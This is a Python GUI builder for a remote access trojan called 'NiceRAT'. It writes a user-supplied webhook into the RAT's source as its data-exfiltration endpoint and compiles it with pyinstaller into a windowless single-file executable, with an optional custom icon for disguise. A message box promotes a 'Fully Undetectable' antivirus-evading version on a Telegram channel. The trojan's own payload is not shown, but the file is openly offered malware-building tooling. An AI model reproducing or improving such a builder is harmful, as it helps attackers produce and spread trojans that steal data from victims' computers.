import os
import webbrowser
from tkinter import filedialog, messagebox
import customtkinter as ctk
from PIL import Image

# Configuration
APP_GEOMETRY = "450x450"
APP_BACKGROUND_COLOR = "#F9FAF8"
ICON_PATH = "img"
FILE_PATH = 'NiceRAT.py'

# Appearance
ctk.set_appearance_mode("light")

# Create the main application window
app = ctk.CTk()
app.title("NiceRAT")
app.iconbitmap(os.path.join(ICON_PATH, "Nice.ico"))
app.geometry(APP_GEOMETRY)
app.resizable(False, False)
app.configure(background=APP_BACKGROUND_COLOR)
app.update_idletasks()

# Center the window
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

def validate_webhook(webhook):
    return 'api/webhooks' in webhook

def replace_webhook(webhook):
    with open(FILE_PATH, 'r+', encoding='utf-8') as file:
        lines = file.readlines()
        file.seek(0)
        for line in lines:
            if line.strip().startswith('h00k ='):
                file.write(f'h00k = "{webhook}"\n')
            else:
                file.write(line)

def toggle_password_visibility(event):
    if entry.cget('show') == '*':
        entry.configure(show='')
        password.configure(light_image=Image.open(os.path.join("img\\hide.png")))
    else:
        entry.configure(show='*')
        password.configure(light_image=Image.open(os.path.join("img\\show.png")))

def select_icon():
    return filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])

def add_icon():
    return check_var.get() == "on"

def build_exe():
    webhook = entry.get()
    if validate_webhook(webhook):
        replace_webhook(webhook)
        icon_option = ""
        if add_icon():
            icon_path = select_icon()
            if not icon_path:
                messagebox.showerror("Error", "No icon file selected.")
                return
            icon_option = f' --icon="{icon_path}"'

            message_title = "Starting Build Process"
            message_body = (
            "Please be patient as this may take some time.\n"
            "Note: The executable will not be undetectable by AV.\n"
            "For a Fully Undetectable (FUD) version, please visit our Telegram channel: https://t.me/NicestRAT\n"
            "Click on OK to start the build.\n"
        )
        messagebox.showinfo(message_title, message_body)
        os.system(f'pyinstaller {FILE_PATH} --noconsole --onefile{icon_option}')


        messagebox.showinfo("Build Success", "Build process completed successfully. Check your dist folder.\nDon't forget to star the repo and join Telegram channel to support and receive lastest updates!")
    else:
        messagebox.showerror("Error", "Invalid webhook URL!")

def open_link(url):
    webbrowser.open(url)

# GUI Elements
background_image = Image.open(os.path.join(ICON_PATH, "bg.png"))
bg = ctk.CTkImage(light_image=background_image, size=(450, 450))
bg_label = ctk.CTkLabel(master=app, image=bg, text='', fg_color="#F8F8F8")
bg_label.place(relx=0.5, rely=0.5, anchor=ctk.CENTER)

entry = ctk.CTkEntry(master=app, width=250, height=30, border_color="#E2E8F0", border_width=1, fg_color="#FFFFFF", placeholder_text="Enter your webhook", corner_radius=5, justify='center', show='*')
entry.place(relx=0.5, rely=0.35, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Build", text_color="#F9FAF8", border_color="#e5e7eb", border_width=0, hover_color="#6FA5D8", fg_color="#5898D4", corner_radius=5, command=build_exe)
button.place(relx=0.5, rely=0.45, anchor=ctk.CENTER)

check_var = ctk.StringVar(value="off")
checkbox = ctk.CTkCheckBox(master=app, text='', variable=check_var, onvalue="on", offvalue="off", width=10, height=10, bg_color="#F8F8F8")
checkbox.place(relx=0.7, rely=0.62, anchor=ctk.CENTER)

# Links with icons
telegram_icon = Image.open(os.path.join(ICON_PATH, "telegram.png"))
telegram = ctk.CTkImage(light_image=telegram_icon, size=(25, 25))
telegram_label = ctk.CTkLabel(master=app, image=telegram, text='', fg_color="#F8F8F8")
telegram_label.place(relx=0.3, rely=0.8, anchor=ctk.CENTER)
telegram_label.bind("<Button-1>", lambda e: open_link('https://t.me/NicestRAT'))

web_icon = Image.open(os.path.join(ICON_PATH, "web.png"))
web = ctk.CTkImage(light_image=web_icon, size=(25, 25))
web_label = ctk.CTkLabel(master=app, image=web, text='', fg_color="#F8F8F8")
web_label.place(relx=0.5, rely=0.8, anchor=ctk.CENTER)
web_label.bind("<Button-1>", lambda e: open_link('https://www.nicerat.com'))

github_icon = Image.open(os.path.join(ICON_PATH, "github.png"))
github = ctk.CTkImage(light_image=github_icon, size=(25, 25))
github_label = ctk.CTkLabel(master=app, image=github, text='', fg_color="#F8F8F8")
github_label.place(relx=0.7, rely=0.8, anchor=ctk.CENTER)
github_label.bind("<Button-1>", lambda e: open_link('https://github.com/0x00G/NiceRAT'))

# Main event loop
app.mainloop()
